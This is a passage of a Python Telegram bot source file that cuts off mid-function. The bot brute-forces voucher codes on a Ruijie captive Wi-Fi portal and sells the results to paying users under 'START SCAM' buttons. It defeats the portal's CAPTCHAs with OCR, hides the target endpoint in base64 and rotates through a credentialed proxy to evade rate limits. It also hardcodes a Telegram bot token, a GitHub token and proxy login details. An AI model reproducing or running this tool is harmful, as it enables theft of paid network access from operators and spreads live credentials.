import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, threading, hashlib
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from collections import deque

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8867816797:AAFXkNP8MJEIjAHZRsRAUDhAn_EgmeLYowg"
GITHUB_TOKEN = '8971195833:AAGJVTAkqMI7UebWGC7dh2oY3CGvxPm-Zx4'
REPO_OWNER = "makkqt"
REPO_NAME = "yes"

# ==================== ADMIN CONFIGURATION ====================
ADMINS = [
    "7366841341",
    "8728200516"
]

ADMIN_USERNAME = "@kuranomi | @makxcross_admin"

def is_admin(user_id):
    return str(user_id) in ADMINS

# ==================== PROXY CONFIG ====================
PROXY_LIST = [
    "kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754",
] * 15

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 20
active_scans_count = 0
active_scans_lock = asyncio.Lock()

paid_users = {}

# ==================== CAPTCHA CACHE SYSTEM ====================
CAPTCHA_CACHE_FILE = "captcha.json"
_captcha_cache = {}
_cache_lock = threading.Lock()
_cache_save_counter = 0
_ocr = ddddocr.DdddOcr(show_ad=False)

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

async def load_captcha_cache():
    global _captcha_cache
    try:
        data, _ = await get_file_content(CAPTCHA_CACHE_FILE)
        if data and isinstance(data, dict):
            _captcha_cache = data
            print(f"[CaptchaCache] Loaded {len(_captcha_cache)} cached CAPTCHAs")
        else:
            _captcha_cache = {}
    except Exception as e:
        print(f"[CaptchaCache] Load error: {e}")
        _captcha_cache = {}

async def save_captcha_cache(force=False):
    global _captcha_cache, _cache_save_counter
    try:
        if not force:
            _cache_save_counter += 1
            if _cache_save_counter % 20 != 0:
                return
        
        current_data, sha = await get_file_content(CAPTCHA_CACHE_FILE)
        if current_data is None:
            current_data = {}
        
        current_data.update(_captcha_cache)
        
        if len(current_data) > 2000:
            items = list(current_data.items())
            current_data = dict(items[-2000:])
            _captcha_cache = current_data
        
        await update_file_content(CAPTCHA_CACHE_FILE, current_data, sha, f"Update CAPTCHA cache ({len(_captcha_cache)} entries)")
        print(f"[CaptchaCache] Saved {len(_captcha_cache)} CAPTCHAs")
    except Exception as e:
        print(f"[CaptchaCache] Save error: {e}")

async def get_captcha_from_cache(image_bytes):
    global _captcha_cache
    if not image_bytes:
        return None
    
    img_hash = hashlib.md5(image_bytes).hexdigest()
    
    with _cache_lock:
        if img_hash in _captcha_cache:
            return _captcha_cache[img_hash]
    
    text = await _solve_captcha_async(image_bytes)
    
    if text and len(text) >= 4:
        with _cache_lock:
            _captcha_cache[img_hash] = text
        asyncio.create_task(save_captcha_cache())
        return text
    
    return None

async def _solve_captcha_async(image_bytes):
    return await asyncio.get_event_loop().run_in_executor(
        None,
        _solve_captcha_sync,
        image_bytes
    )

def _solve_captcha_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        
        kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
        sharpened = cv2.filter2D(thresh, -1, kernel)
        
        _, buffer = cv2.imencode('.png', sharpened)
        result = _ocr.classification(buffer.tobytes())
        return result.upper() if result else None
    except Exception as e:
        print(f"[OCR] Error: {e}")
        return None

# ============================================================
# 🔥 PERFORM_CHECK WITH CAPTCHA CACHE & PROXY
# ============================================================

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    resp_json = {}
    
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        proxy = get_next_proxy()
        
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None, proxy=proxy)
            if not session_id:
                return
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id, proxy=proxy)
                    text = await Captcha_Text_Cached(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text, proxy=proxy)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Geo) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            
            try:
                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                    response = await req.text()
                    try:
                        resp_json = json.loads(response)
                    except:
                        resp_json = {}
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    err_code = resp_json.get("errorCode", resp_json.get("code", -1))
    is_success = (
        'logonUrl' in response or 
        resp_json.get("success") is True or 
        err_code == 0 or 
        err_code == "0" or 
        '"code":0' in response
    )

    if err_code in [1, 2, 3, 4, 400, 404, 500] or "invalid" in str(response).lower() or "expired" in str(response).lower():
        is_success = False

    if is_success:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []

        expire_date, raw_mins = await Code_Expires_Date(session_id, proxy=proxy)
        
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        current_display = user_data[chat_id].get('current_display_codes', [])
        current_display.append(f"🎫 {code}\n   {expire_date}")
        
        code_line = "\n\n".join(current_display)
        
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        
        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                    success_messages[chat_id] = sent.message_id
                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                        user_data[chat_id]['current_display_codes'] = current_display
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                        success_messages[chat_id] = sent.message_id
                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန် နှိပ်ပါ", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    else:
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
👨‍💻 Admin: {ADMIN_USERNAME}"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_back":
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access"""
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]"""
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_start_scam":
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.answer_callback_query(call.id, "⚠️ Bot အလုပ်များနေပါသည်။", show_alert=True)
                return
            active_scans_count += 1
        
        mode = user_data[chat_id].get('selected_mode', '6')
        start_digit = user_data[chat_id].get('start_digit')
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return

    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return
        user_data[chat_id]['selected_mode'] = mode
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 VOUCHER Mode: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]")
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    user_data[message.chat.id]['session_url'] = url
    await bot.reply_to(message, "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_voucher_keyboard())

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def mixed_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.dig
